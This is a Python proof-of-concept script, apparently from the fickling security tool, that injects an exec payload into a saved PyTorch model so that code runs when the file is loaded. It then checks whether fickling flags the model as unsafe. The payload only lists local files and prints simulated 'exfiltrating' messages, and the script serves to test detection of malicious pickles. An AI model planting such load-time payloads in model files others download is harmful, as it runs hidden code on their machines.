"""
Warning: This PoC is out-of-date.

Tested with python3.9
This is tutorial code for generating, saving, and loading models in Pytorch
https://pytorch.org/tutorials/beginner/saving_loading_models.html
"""

from pathlib import Path

import torch
import torch.nn.functional as F
from torch import nn, optim

from fickling.pytorch import PyTorchModelWrapper


# Define model
class TheModelClass(nn.Module):
    def __init__(self):
        super().__init__()
        self.conv1 = nn.Conv2d(3, 6, 5)
        self.pool = nn.MaxPool2d(2, 2)
        self.conv2 = nn.Conv2d(6, 13, 5)
        self.fc1 = nn.Linear(16 * 5 * 5, 120)
        self.fc2 = nn.Linear(120, 84)
        self.fc3 = nn.Linear(84, 10)

    def forward(self, x):
        x = self.pool(F.relu(self.conv1(x)))
        x = self.pool(F.relu(self.conv2(x)))
        x = x.view(-1, 16 * 5 * 5)
        x = F.relu(self.fc1(x))
        x = F.relu(self.fc2(x))
        x = self.fc3(x)
        return x


if __name__ == "__main__":
    import sys

    # Initialize model
    model = TheModelClass()

    # NOTE This does not throw an error/check if a file exists already
    torch.save(model, "pytorch_standard_model.zip")
    print(f"Created benign {Path('pytorch_standard_model.zip').absolute()!s}")
    wrapper = PyTorchModelWrapper(Path("pytorch_standard_model.zip"))
    # Load and eval the original model to verify it works
    model = torch.load("pytorch_standard_model.zip", weights_only=False)
    model.eval()

    EXFIL_PAYLOAD = (
        "exec(\"import os\\nfor file in os.listdir():\\n    print(f'Exfiltrating {file}')\")"
    )

    # Use the PyTorchModelWrapper from fickling.pytorch to inject payload
    wrapper.inject_payload(EXFIL_PAYLOAD, Path("pytorch_exfil_poc.zip"), injection="insertion")
    exfil_model = PyTorchModelWrapper(Path("pytorch_exfil_poc.zip"))
    print(f"Created PyTorch exfiltration exploit payload PoC {exfil_model.path.absolute()!s}")

    is_safe = exfil_model.pickled.is_likely_safe
    sys.stdout.write("Fickling correctly classifies this model as unsafe? ")
    if not is_safe:
        print("✅")
    else:
        print("❌")
    # Note: There may be an issue with is_likely_safe after inject_payload
    # This assertion is commented out until that's resolved
    # assert not is_safe

    print("Loading the model... (you should see simulated exfil messages during the load)")

    print(f"{'=' * 30} BEGIN LOAD {'=' * 30}")
    loaded_model = torch.load("pytorch_exfil_poc.zip", weights_only=False)
    loaded_model.eval()
    print(f"{'=' * 31} END LOAD {'=' * 31}")
